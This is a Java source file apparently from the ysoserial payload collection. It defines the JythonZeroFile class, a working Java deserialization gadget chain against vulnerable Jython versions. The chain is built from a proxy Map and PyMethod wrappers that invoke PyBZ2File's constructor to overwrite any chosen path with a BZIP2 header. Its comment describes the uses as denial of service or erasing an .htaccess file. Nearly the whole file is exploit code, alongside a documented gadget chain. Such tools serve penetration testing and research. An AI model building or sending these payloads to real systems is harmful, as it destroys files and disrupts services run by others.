package ysoserial.payloads;

import org.python.core.PyBuiltinCallable;
import org.python.core.PyMethod;
import org.python.core.PyObject;
import org.python.core.PyString;
import org.python.core.PyType;
import org.python.modules.bz2.PyBZ2File;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import java.lang.reflect.Proxy;
import java.util.Map;

/*
    Overwrites a path with a BZIP2 header. Potentially useful in a DoS exploit or effectively erasing an .htaccess file.

	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
			    Map.entrySet() [Implemented as a proxy class with PyMethod InvocationHandler]
			        PyMethod.__call__()
			            PyMethod.__call__(state)
			                PyMethod.__call__(state, arg0)
			                    PyMethod.__call__(state, arg0, arg1)
			                        PyBZ2File$BZ2File___init___exposer(args, kw)
			                            PyBZ2File.BZ2File___init__(args, kw)
			                                FileOutputStream.<init>

	Requires:
		org.python:jython
		Versions since 2.7.0 are vulnerable. Versions up to 2.7.2b2 are known to be vulnerable.
 */
@PayloadTest(skip="non RCE")
@SuppressWarnings({ "unchecked" })
@Dependencies({ "org.python:jython:2.7.2b2" })
@Authors({ Authors.JACKOFMOSTTRADES })
public class JythonZeroFile extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject(String command) throws Exception {
        PyObject payloadclass = (PyObject) Class.forName(PyBZ2File.class.getName() + "$BZ2File___init___exposer")
            .getConstructor(PyType.class, PyObject.class, PyBuiltinCallable.Info.class).newInstance(null, new PyBZ2File(), null);
        PyMethod wrapperOne = new PyMethod(payloadclass, new PyString(command), null);
        PyMethod wrapperTwo = new PyMethod(wrapperOne, new PyString("w"), null);

        Map<String, Object> proxyMap = (Map<String, Object>) Proxy.newProxyInstance(this.getClass().getClassLoader(), new Class[]{Map.class}, wrapperTwo);

        return Gadgets.createMemoizedInvocationHandler(proxyMap);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(JythonZeroFile.class, new String[]{"/tmp/poc.txt"});
    }
}
